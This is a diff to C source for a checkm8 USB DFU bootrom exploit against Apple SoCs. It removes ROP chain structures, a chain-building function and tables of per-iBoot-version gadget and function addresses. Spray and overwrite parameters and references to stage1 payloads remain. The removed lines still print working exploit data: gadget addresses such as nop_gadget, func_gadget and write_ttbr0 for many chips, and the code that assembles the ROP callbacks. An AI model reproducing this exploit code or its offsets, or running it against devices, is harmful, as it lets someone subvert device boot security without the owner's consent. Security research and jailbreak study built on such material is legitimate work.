@@ -25,17 +25,12 @@
 #define DFU_FILE_SUFFIX_LEN 16u
 #define DFU_MAX_TRANSFER_SZ 0x800u
 #define EP0_MAX_PACKET_SZ 0x40u
-#define MAX_BLOCK_SZ 0x50u
 #define USB_MAX_STRING_DESCRIPTOR_IDX 10u
 #define CONTROL_TIMEOUT_MS 500u
 #define USB_TIMEOUT_MS 5u
 #define USB_ABORT_TIMEOUT_MIN_MS 0u
 #define ABORT_TIMEOUT_SCALE_US 265u
 
-#define DONE_MAGIC 0x646F6E65646F6E65ULL
-#define EXEC_MAGIC 0x6578656365786563ULL
-#define MEMC_MAGIC 0x6D656D636D656D63ULL
-#define ARM_16K_TT_L2_SZ 0x2000000u
 
 #ifndef MIN
 #define MIN(a, b) ((a) < (b) ? (a) : (b))
@@ -59,41 +54,6 @@ typedef struct {
 } transfer_ret_t;
 
 typedef struct {
-    uint64_t func;
-    uint64_t arg;
-} callback_t;
-
-typedef struct {
-    uint32_t endpoint;
-    uint32_t pad_0;
-    uint64_t io_buffer;
-    uint32_t status;
-    uint32_t io_len;
-    uint32_t ret_cnt;
-    uint32_t pad_1;
-    uint64_t callback;
-    uint64_t next;
-} dfu_callback_t;
-
-typedef struct {
-    uint32_t endpoint;
-    uint32_t io_buffer;
-    uint32_t status;
-    uint32_t io_len;
-    uint32_t ret_cnt;
-    uint32_t callback;
-    uint32_t next;
-} dfu_callback_armv7_t;
-
-typedef struct {
-    dfu_callback_t callback;
-} checkm8_overwrite_t;
-
-typedef struct {
-    dfu_callback_armv7_t callback;
-} checkm8_overwrite_armv7_t;
-
-typedef struct {
     volatile bool done;
     volatile xfer_result_t result;
     volatile uint32_t actual_len;
@@ -105,29 +65,9 @@ typedef struct {
     uint16_t cpid;
     uint8_t serial_idx;
     size_t config_hole;
-    size_t ttbr0_vrom_off;
-    size_t ttbr0_sram_off;
     size_t config_large_leak;
     size_t config_overwrite_pad;
-    uint64_t tlbi;
-    uint64_t nop_gadget;
-    uint64_t ret_gadget;
-    uint64_t patch_addr;
-    uint64_t ttbr0_addr;
-    uint64_t func_gadget;
-    uint64_t write_ttbr0;
-    uint64_t memcpy_addr;
-    uint64_t aes_crypto_cmd;
-    uint64_t boot_tramp_end;
-    uint64_t gUSBSerialNumber;
-    uint64_t dfu_handle_request;
-    uint64_t usb_core_do_transfer;
-    uint64_t dfu_handle_bus_reset;
     uint64_t insecure_memory_base;
-    uint64_t handle_interface_request;
-    uint64_t usb_create_string_descriptor;
-    uint64_t usb_serial_number_string_descriptor;
-    uint32_t payload_dest_armv7;
 } checkm8_context_t;
 
 static uint8_t control_zero_buf[DFU_MAX_TRANSFER_SZ + 1];
@@ -351,68 +291,6 @@ static bool raw_control_out(uint8_t daddr, uint8_t bm_request_type, uint8_t b_re
 out:
     if (!ok) {
         raw_hw_abort();
-    }
-    raw_hw_exit();
-    return ok;
-}
-
-static bool raw_control_in(uint8_t daddr, uint8_t bm_request_type, uint8_t b_request,
-                           uint16_t w_value, uint16_t w_index, void *data, size_t len,
-                           bool require_status, transfer_ret_t *transfer_ret) {
-    uint8_t setup[8];
-    bool ok = false;
-    uint32_t total_received = 0;
-
-    setup_packet(setup, bm_request_type, b_request, w_value, w_index, (uint16_t)len);
-    raw_hw_enter();
-
-    raw_hw_result_t r = raw_hw_send_setup(daddr, setup, CONTROL_TIMEOUT_MS);
-    if (r != RAW_HW_OK) goto out;
-
-    if (len != 0) {
-        size_t off = 0;
-        while (off < len) {
-            uint16_t chunk = (uint16_t)MIN(len - off, EP0_MAX_PACKET_SZ);
-            uint16_t actual = 0;
-            r = raw_hw_data_in(daddr, (uint8_t *)data + off, chunk,
-                               require_status ? CONTROL_TIMEOUT_MS : USB_TIMEOUT_MS, &actual);
-            if (r != RAW_HW_OK) {
-                total_received = (uint32_t)off;
-                goto out;
-            }
-            off += actual;
-            if (actual < chunk) break;
-        }
-        total_received = (uint32_t)off;
-    }
-
-    {
-        uint16_t status_actual = 0;
-        raw_data_pid = 1;
-        r = raw_hw_data_out(daddr, NULL, 0,
-                            require_status ? CONTROL_TIMEOUT_MS : USB_TIMEOUT_MS, &status_actual);
-        if (r != RAW_HW_OK && !require_status) {
-            ok = true;
-            goto out;
-        }
-        if (r != RAW_HW_OK) goto out;
-    }
-
-    ok = true;
-
-out:
-    if (!ok) {
-        raw_hw_abort();
-    }
-    if (transfer_ret) {
-        transfer_ret->sz = total_received;
-        if (ok) {
-            transfer_ret->ret = USB_TRANSFER_OK;
-        } else if (r == RAW_HW_STALL) {
-            transfer_ret->ret = USB_TRANSFER_STALL;
-        } else {
-            transfer_ret->ret = USB_TRANSFER_ERROR;
-        }
     }
     raw_hw_exit();
     return ok;
@@ -784,291 +662,77 @@ static bool configure_target_from_serial(char const *serial) {
         ctx.cpid = 0x8950;
         ctx.config_large_leak = 659;
         ctx.config_overwrite_pad = 0x640;
-        ctx.memcpy_addr = 0x9ACC;
-        ctx.aes_crypto_cmd = 0x7301;
-        ctx.gUSBSerialNumber = 0x10061F80;
-        ctx.dfu_handle_request = 0x10061A24;
-        ctx.payload_dest_armv7 = 0x10079800;
-        ctx.usb_core_do_transfer = 0x7621;
-        ctx.dfu_handle_bus_reset = 0x10061A3C;
         ctx.insecure_memory_base = 0x10000000;
-        ctx.handle_interface_request = 0x8161;
-        ctx.usb_create_string_descriptor = 0x7C55;
-        ctx.usb_serial_number_string_descriptor = 0x100600D8;
     } else if (serial_contains(serial, " SRTG:[iBoot-1145.3.3]")) {
         ctx.cpid = 0x8955;
         ctx.config_large_leak = 659;
         ctx.config_overwrite_pad = 0x640;
-        ctx.memcpy_addr = 0x9B0C;
-        ctx.aes_crypto_cmd = 0x7341;
-        ctx.gUSBSerialNumber = 0x10061F80;
-        ctx.dfu_handle_request = 0x10061A24;
-        ctx.payload_dest_armv7 = 0x10079800;
-        ctx.usb_core_do_transfer = 0x7661;
-        ctx.dfu_handle_bus_reset = 0x10061A3C;
         ctx.insecure_memory_base = 0x10000000;
-        ctx.handle_interface_request = 0x81A1;
-        ctx.usb_create_string_descriptor = 0x7C95;
-        ctx.usb_serial_number_string_descriptor = 0x100600D8;
     } else if (serial_contains(serial, " SRTG:[iBoot-1458.2]")) {
         ctx.cpid = 0x8947;
         ctx.config_large_leak = 626;
         ctx.config_overwrite_pad = 0x660;
-        ctx.memcpy_addr = 0x9A3C;
-        ctx.aes_crypto_cmd = 0x7061;
-        ctx.gUSBSerialNumber = 0x3402DDF8;
-        ctx.dfu_handle_request = 0x3402D92C;
-        ctx.payload_dest_armv7 = 0x34039800;
-        ctx.usb_core_do_transfer = 0x79ED;
-        ctx.dfu_handle_bus_reset = 0x3402D944;
         ctx.insecure_memory_base = 0x34000000;
-        ctx.handle_interface_request = 0x7BC9;
-        ctx.usb_create_string_descriptor = 0x72A9;
-        ctx.usb_serial_number_string_descriptor = 0x3402C2DA;
     } else if (serial_contains(serial, " SRTG:[iBoot-1704.10]")) {
         ctx.cpid = 0x8960;
         ctx.config_large_leak = 7936;
         ctx.config_overwrite_pad = 0x5C0;
-        ctx.patch_addr = 0x100005CE0;
-        ctx.memcpy_addr = 0x10000ED50;
-        ctx.aes_crypto_cmd = 0x10000B9A8;
-        ctx.boot_tramp_end = 0x1800E1000;
-        ctx.gUSBSerialNumber = 0x180086CDC;
-        ctx.dfu_handle_request = 0x180086C70;
-        ctx.usb_core_do_transfer = 0x10000CC78;
-        ctx.dfu_handle_bus_reset = 0x180086CA0;
         ctx.insecure_memory_base = 0x180380000;
-        ctx.handle_interface_request = 0x10000CFB4;
-        ctx.usb_create_string_descriptor = 0x10000BFEC;
-        ctx.usb_serial_number_string_descriptor = 0x180080562;
     } else if (serial_contains(serial, " SRTG:[iBoot-1991.0.0.2.16]")) {
         ctx.cpid = 0x7001;
         ctx.config_overwrite_pad = 0x500;
-        ctx.patch_addr = 0x10000AD04;
-        ctx.memcpy_addr = 0x100013F10;
-        ctx.aes_crypto_cmd = 0x100010A90;
-        ctx.boot_tramp_end = 0x1800E1000;
-        ctx.gUSBSerialNumber = 0x180088E48;
-        ctx.dfu_handle_request = 0x180088DF8;
-        ctx.usb_core_do_transfer = 0x100011BB4;
-        ctx.dfu_handle_bus_reset = 0x180088E18;
         ctx.insecure_memory_base = 0x180380000;
-        ctx.handle_interface_request = 0x100011EE4;
-        ctx.usb_create_string_descriptor = 0x100011074;
-        ctx.usb_serial_number_string_descriptor = 0x180080C2A;
     } else if (serial_contains(serial, " SRTG:[iBoot-1992.0.0.1.19]")) {
         ctx.cpid = 0x7000;
         ctx.config_overwrite_pad = 0x500;
-        ctx.patch_addr = 0x100007E98;
-        ctx.memcpy_addr = 0x100010E70;
-        ctx.aes_crypto_cmd = 0x10000DA90;
-        ctx.boot_tramp_end = 0x1800E1000;
-        ctx.gUSBSerialNumber = 0x1800888C8;
-        ctx.dfu_handle_request = 0x180088878;
-        ctx.usb_core_do_transfer = 0x10000EBB4;
-        ctx.dfu_handle_bus_reset = 0x180088898;
         ctx.insecure_memory_base = 0x180380000;
-        ctx.handle_interface_request = 0x10000EEE4;
-        ctx.usb_create_string_descriptor = 0x10000E074;
-        ctx.usb_serial_number_string_descriptor = 0x18008062A;
     } else if (serial_contains(serial, " SRTG:[iBoot-2098.0.0.2.4]")) {
         ctx.cpid = 0x7002;
         ctx.config_overwrite_pad = 0x500;
-        ctx.memcpy_addr = 0x89F4;
-        ctx.aes_crypto_cmd = 0x6341;
-        ctx.gUSBSerialNumber = 0x46005958;
-        ctx.dfu_handle_request = 0x46005898;
-        ctx.payload_dest_armv7 = 0x46007800;
-        ctx.usb_core_do_transfer = 0x6E59;
-        ctx.dfu_handle_bus_reset = 0x460058B0;
         ctx.insecure_memory_base = 0x46018000;
-        ctx.handle_interface_request = 0x7081;
-        ctx.usb_create_string_descriptor = 0x6745;
-        ctx.usb_serial_number_string_descriptor = 0x4600034A;
     } else if (serial_contains(serial, " SRTG:[iBoot-2234.0.0.2.22]")) {
         ctx.cpid = 0x8003;
         ctx.config_overwrite_pad = 0x500;
-        ctx.patch_addr = 0x10000812C;
-        ctx.ttbr0_addr = 0x1800C8000;
-        ctx.memcpy_addr = 0x100011030;
-        ctx.aes_crypto_cmd = 0x10000DAA0;
-        ctx.ttbr0_vrom_off = 0x400;
-        ctx.boot_tramp_end = 0x1800E1000;
-        ctx.gUSBSerialNumber = 0x180087958;
-        ctx.dfu_handle_request = 0x1800878F8;
-        ctx.usb_core_do_transfer = 0x10000EE78;
-        ctx.dfu_handle_bus_reset = 0x180087928;
         ctx.insecure_memory_base = 0x180380000;
-        ctx.handle_interface_request = 0x10000F1B0;
-        ctx.usb_create_string_descriptor = 0x10000E354;
-        ctx.usb_serial_number_string_descriptor = 0x1800807DA;
     } else if (serial_contains(serial, " SRTG:[iBoot-2234.0.0.3.3]")) {
         ctx.cpid = 0x8000;
         ctx.config_overwrite_pad = 0x500;
-        ctx.patch_addr = 0x10000812C;
-        ctx.ttbr0_addr = 0x1800C8000;
-        ctx.memcpy_addr = 0x100011030;
-        ctx.aes_crypto_cmd = 0x10000DAA0;
-        ctx.ttbr0_vrom_off = 0x400;
-        ctx.boot_tramp_end = 0x1800E1000;
-        ctx.gUSBSerialNumber = 0x180087958;
-        ctx.dfu_handle_request = 0x1800878F8;
-        ctx.usb_core_do_transfer = 0x10000EE78;
-        ctx.dfu_handle_bus_reset = 0x180087928;
         ctx.insecure_memory_base = 0x180380000;
-        ctx.handle_interface_request = 0x10000F1B0;
-        ctx.usb_create_string_descriptor = 0x10000E354;
-        ctx.usb_serial_number_string_descriptor = 0x1800807DA;
     } else if (serial_contains(serial, " SRTG:[iBoot-2481.0.0.2.1]")) {
         ctx.cpid = 0x8001;
         ctx.config_hole = 6;
         ctx.config_overwrite_pad = 0x5C0;
-        ctx.tlbi = 0x100000404;
-        ctx.nop_gadget = 0x10000CD60;
-        ctx.ret_gadget = 0x100000118;
-        ctx.patch_addr = 0x100007668;
-        ctx.ttbr0_addr = 0x180050000;
-        ctx.func_gadget = 0x10000CD40;
-        ctx.write_ttbr0 = 0x1000003B4;
-        ctx.memcpy_addr = 0x1000106F0;
-        ctx.aes_crypto_cmd = 0x10000C9D4;
-        ctx.boot_tramp_end = 0x180044000;
-        ctx.ttbr0_vrom_off = 0x400;
-        ctx.ttbr0_sram_off = 0x600;
-        ctx.gUSBSerialNumber = 0x180047578;
-        ctx.dfu_handle_request = 0x18004C378;
-        ctx.usb_core_do_transfer = 0x10000DDA4;
-        ctx.dfu_handle_bus_reset = 0x18004C3A8;
         ctx.insecure_memory_base = 0x180000000;
-        ctx.handle_interface_request = 0x10000E0B4;
-        ctx.usb_create_string_descriptor = 0x10000D280;
-        ctx.usb_serial_number_string_descriptor = 0x18004486A;
     } else if (serial_contains(serial, " SRTG:[iBoot-2651.0.0.1.31]")) {
         ctx.cpid = 0x8002;
         ctx.config_hole = 5;
         ctx.config_overwrite_pad = 0x5C0;
-        ctx.memcpy_addr = 0xB6F8;
-        ctx.aes_crypto_cmd = 0x86DD;
-        ctx.gUSBSerialNumber = 0x48802AB8;
-        ctx.dfu_handle_request = 0x48806344;
-        ctx.payload_dest_armv7 = 0x48806E00;
-        ctx.usb_core_do_transfer = 0x9411;
-        ctx.dfu_handle_bus_reset = 0x4880635C;
         ctx.insecure_memory_base = 0x48818000;
-        ctx.handle_interface_request = 0x95F1;
-        ctx.usb_create_string_descriptor = 0x8CA5;
-        ctx.usb_serial_number_string_descriptor = 0x4880037A;
     } else if (serial_contains(serial, " SRTG:[iBoot-2651.0.0.3.3]")) {
         ctx.cpid = 0x8004;
         ctx.config_hole = 5;
         ctx.config_overwrite_pad = 0x5C0;
-        ctx.memcpy_addr = 0xA884;
-        ctx.aes_crypto_cmd = 0x786D;
-        ctx.gUSBSerialNumber = 0x48802AE8;
-        ctx.dfu_handle_request = 0x48806384;
-        ctx.payload_dest_armv7 = 0x48806E00;
-        ctx.usb_core_do_transfer = 0x85A1;
-        ctx.dfu_handle_bus_reset = 0x4880639C;
         ctx.insecure_memory_base = 0x48818000;
-        ctx.handle_interface_request = 0x877D;
-        ctx.usb_create_string_descriptor = 0x7E35;
-        ctx.usb_serial_number_string_descriptor = 0x488003CA;
     } else if (serial_contains(serial, " SRTG:[iBoot-2696.0.0.1.33]")) {
         ctx.cpid = 0x8010;
         ctx.config_hole = 5;
         ctx.config_overwrite_pad = 0x5C0;
-        ctx.tlbi = 0x100000434;
-        ctx.nop_gadget = 0x10000CC6C;
-        ctx.ret_gadget = 0x10000015C;
-        ctx.patch_addr = 0x1000074AC;
-        ctx.ttbr0_addr = 0x1800A0000;
-        ctx.func_gadget = 0x10000CC4C;
-        ctx.write_ttbr0 = 0x1000003E4;
-        ctx.memcpy_addr = 0x100010730;
-        ctx.aes_crypto_cmd = 0x10000C8F4;
-        ctx.boot_tramp_end = 0x1800B0000;
-        ctx.ttbr0_vrom_off = 0x400;
-        ctx.ttbr0_sram_off = 0x600;
-        ctx.gUSBSerialNumber = 0x180083CF8;
-        ctx.dfu_handle_request = 0x180088B48;
-        ctx.usb_core_do_transfer = 0x10000DC98;
-        ctx.dfu_handle_bus_reset = 0x180088B78;
         ctx.insecure_memory_base = 0x1800B0000;
-        ctx.handle_interface_request = 0x10000DFB8;
-        ctx.usb_create_string_descriptor = 0x10000D150;
-        ctx.usb_serial_number_string_descriptor = 0x1800805DA;
     } else if (serial_contains(serial, " SRTG:[iBoot-3135.0.0.2.3]")) {
         ctx.cpid = 0x8011;
         ctx.config_hole = 6;
         ctx.config_overwrite_pad = 0x540;
-        ctx.tlbi = 0x100000444;
-        ctx.nop_gadget = 0x10000CD0C;
-        ctx.ret_gadget = 0x100000148;
-        ctx.patch_addr = 0x100007630;
-        ctx.ttbr0_addr = 0x1800A0000;
-        ctx.func_gadget = 0x10000CCEC;
-        ctx.write_ttbr0 = 0x1000003F4;
-        ctx.memcpy_addr = 0x100010950;
-        ctx.aes_crypto_cmd = 0x10000C994;
-        ctx.boot_tramp_end = 0x1800B0000;
-        ctx.ttbr0_vrom_off = 0x400;
-        ctx.ttbr0_sram_off = 0x600;
-        ctx.gUSBSerialNumber = 0x180083D28;
-        ctx.dfu_handle_request = 0x180088A58;
-        ctx.usb_core_do_transfer = 0x10000DD64;
-        ctx.dfu_handle_bus_reset = 0x180088A88;
         ctx.insecure_memory_base = 0x1800B0000;
-        ctx.handle_interface_request = 0x10000E08C;
-        ctx.usb_create_string_descriptor = 0x10000D234;
-        ctx.usb_serial_number_string_descriptor = 0x18008062A;
     } else if (serial_contains(serial, " SRTG:[iBoot-3332.0.0.1.23]")) {
         ctx.cpid = 0x8015;
         ctx.config_hole = 6;
         ctx.config_overwrite_pad = 0x540;
-        ctx.tlbi = 0x1000004AC;
-        ctx.nop_gadget = 0x10000A9C4;
-        ctx.ret_gadget = 0x100000148;
-        ctx.patch_addr = 0x10000624C;
-        ctx.ttbr0_addr = 0x18000C000;
-        ctx.func_gadget = 0x10000A9AC;
-        ctx.write_ttbr0 = 0x10000045C;
-        ctx.memcpy_addr = 0x10000E9D0;
-        ctx.aes_crypto_cmd = 0x100009E9C;
-        ctx.boot_tramp_end = 0x18001C000;
-        ctx.ttbr0_vrom_off = 0x400;
-        ctx.ttbr0_sram_off = 0x600;
-        ctx.gUSBSerialNumber = 0x180003A78;
-        ctx.dfu_handle_request = 0x180008638;
-        ctx.usb_core_do_transfer = 0x10000B9A8;
-        ctx.dfu_handle_bus_reset = 0x180008668;
         ctx.insecure_memory_base = 0x18001C000;
-        ctx.handle_interface_request = 0x10000BCCC;
-        ctx.usb_create_string_descriptor = 0x10000AE80;
-        ctx.usb_serial_number_string_descriptor = 0x1800008FA;
     } else if (serial_contains(serial, " SRTG:[iBoot-3401.0.0.1.16]")) {
         ctx.cpid = 0x8012;
         ctx.config_hole = 6;
         ctx.config_overwrite_pad = 0x540;
-        ctx.tlbi = 0x100000494;
-        ctx.nop_gadget = 0x100008DB8;
-        ctx.ret_gadget = 0x10000012C;
-        ctx.patch_addr = 0x100004854;
-        ctx.ttbr0_addr = 0x18000C000;
-        ctx.func_gadget = 0x100008DA0;
-        ctx.write_ttbr0 = 0x100000444;
-        ctx.memcpy_addr = 0x10000EA30;
-        ctx.aes_crypto_cmd = 0x1000082AC;
-        ctx.boot_tramp_end = 0x18001C000;
-        ctx.ttbr0_vrom_off = 0x400;
-        ctx.ttbr0_sram_off = 0x600;
-        ctx.gUSBSerialNumber = 0x180003AF8;
-        ctx.dfu_handle_request = 0x180008B08;
-        ctx.usb_core_do_transfer = 0x10000BD20;
-        ctx.dfu_handle_bus_reset = 0x180008B38;
         ctx.insecure_memory_base = 0x18001C000;
-        ctx.handle_interface_request = 0x10000BFFC;
-        ctx.usb_create_string_descriptor = 0x10000B1CC;
-        ctx.usb_serial_number_string_descriptor = 0x18000082A;
     }
 
     return ctx.cpid != 0;
@@ -1093,35 +757,6 @@ static bool dfu_check_status(uint8_t daddr, uint8_t status, uint8_t state) {
               dfu_status.state == state;
 
     app_logf("checkm8: GET_STATUS want=%u queued=%u ret=%s sz=%lu status=%u state=%u\r\n",
-             state,
-             queued ? 1u : 0u,
-             transfer_name(transfer_ret.ret),
-             (unsigned long)transfer_ret.sz,
-             dfu_status.status,
-             dfu_status.state);
-
-    return ok;
-}
-
-static bool raw_dfu_check_status(uint8_t daddr, uint8_t status, uint8_t state) {
-    struct {
-        uint8_t status;
-        uint8_t poll_timeout[3];
-        uint8_t state;
-        uint8_t str_idx;
-    } dfu_status;
-    transfer_ret_t transfer_ret;
-
-    memset(&dfu_status, 0, sizeof(dfu_status));
-    bool queued = raw_control_in(daddr, 0xA1, DFU_GET_STATUS, 0, 0,
-                                     &dfu_status, sizeof(dfu_status), false, &transfer_ret);
-    bool ok = queued &&
-              transfer_ret.ret == USB_TRANSFER_OK &&
-              transfer_ret.sz == sizeof(dfu_status) &&
-              dfu_status.status == status &&
-              dfu_status.state == state;
-
-    app_logf("checkm8: RAW_GET_STATUS want=%u queued=%u ret=%s sz=%lu status=%u state=%u\r\n",
              state,
              queued ? 1u : 0u,
              transfer_name(transfer_ret.ret),
@@ -1383,133 +1018,7 @@ static bool checkm8_stage_spray(uint8_t daddr) {
     return true;
 }
 
-static size_t usb_rop_callbacks(uint8_t *buf, uint64_t addr, callback_t const *callbacks, size_t callback_cnt) {
-    uint8_t block_0[MAX_BLOCK_SZ];
-    uint8_t block_1[MAX_BLOCK_SZ];
-    size_t sz = 0;
-
-    for (size_t i = 0; i < callback_cnt; i += 5) {
-        size_t block_0_sz = 0;
-        size_t block_1_sz = 0;
-
-        for (size_t j = 0; j < 5; j++) {
-            uint64_t reg;
-
-            addr += MAX_BLOCK_SZ / 5;
-            if (j == 4) {
-                addr += MAX_BLOCK_SZ;
-            }
-
-            if (i + j < callback_cnt - 1) {
-                reg = ctx.func_gadget;
-                memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
-                block_0_sz += sizeof(reg);
-                reg = addr;
-                memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
-                block_0_sz += sizeof(reg);
-                reg = callbacks[i + j].arg;
-                memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
-                block_1_sz += sizeof(reg);
-                reg = callbacks[i + j].func;
-                memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
-                block_1_sz += sizeof(reg);
-            } else if (i + j == callback_cnt - 1) {
-                reg = ctx.func_gadget;
-                memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
-                block_0_sz += sizeof(reg);
-                reg = 0;
-                memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
-                block_0_sz += sizeof(reg);
-                reg = callbacks[i + j].arg;
-                memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
-                block_1_sz += sizeof(reg);
-                reg = callbacks[i + j].func;
-                memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
-                block_1_sz += sizeof(reg);
-            } else {
-                reg = 0;
-                memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
-                block_0_sz += sizeof(reg);
-                memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
-                block_0_sz += sizeof(reg);
-            }
-        }
-
-        memcpy(buf + sz, block_0, block_0_sz);
-        sz += block_0_sz;
-        memcpy(buf + sz, block_1, block_1_sz);
-        sz += block_1_sz;
-    }
-
-    return sz;
-}
-
 static bool checkm8_stage_patch(uint8_t daddr) {
-    struct {
-        uint64_t pwnd[2];
-        uint64_t payload_dest;
-        uint64_t dfu_handle_bus_reset;
-        uint64_t dfu_handle_request;
-        uint64_t payload_off;
-        uint64_t payload_sz;
-        uint64_t memcpy_addr;
-        uint64_t gUSBSerialNumber;
-        uint64_t usb_create_string_descriptor;
-        uint64_t usb_serial_number_string_descriptor;
-        uint64_t ttbr0_vrom_addr;
-        uint64_t patch_addr;
-    } A9;
-    struct {
-        uint64_t pwnd[2];
-        uint64_t payload_dest;
-        uint64_t dfu_handle_bus_reset;
-        uint64_t dfu_handle_request;
-        uint64_t payload_off;
-        uint64_t payload_sz;
-        uint64_t memcpy_addr;
-        uint64_t gUSBSerialNumber;
-        uint64_t usb_create_string_descriptor;
-        uint64_t usb_serial_number_string_descriptor;
-        uint64_t patch_addr;
-    } notA9;
-    struct {
-        uint32_t pwnd[4];
-        uint32_t payload_dest;
-        uint32_t dfu_handle_bus_reset;
-        uint32_t dfu_handle_request;
-        uint32_t payload_off;
-        uint32_t payload_sz;
-        uint32_t memcpy_addr;
-        uint32_t gUSBSerialNumber;
-        uint32_t usb_create_string_descriptor;
-        uint32_t usb_serial_number_string_descriptor;
-    } notA9_armv7;
-    struct {
-        uint64_t handle_interface_request;
-        uint64_t insecure_memory_base;
-        uint64_t exec_magic;
-        uint64_t done_magic;
-        uint64_t memc_magic;
-        uint64_t memcpy_addr;
-        uint64_t usb_core_do_transfer;
-    } handle_checkm8_request;
-    struct {
-        uint32_t handle_interface_request;
-        uint32_t insecure_memory_base;
-        uint32_t exec_magic;
-        uint32_t done_magic;
-        uint32_t memc_magic;
-        uint32_t memcpy_addr;
-        uint32_t usb_core_do_transfer;
-    } handle_checkm8_request_armv7;
-    callback_t callbacks[] = {
-        {ctx.write_ttbr0, ctx.insecure_memory_base},
-        {ctx.tlbi, 0},
-        {ctx.insecure_memory_base + ARM_16K_TT_L2_SZ + ctx.ttbr0_sram_off + 2 * sizeof(uint64_t), 0},
-        {ctx.write_ttbr0, ctx.ttbr0_addr},
-        {ctx.tlbi, 0},
-        {ctx.ret_gadget, 0},
-    };
     extern uint8_t const stage1_a9_8000_bin[];
     extern uint8_t const stage1_a9_8000_bin_end[];
     extern uint8_t const stage1_a9_8003_bin[];
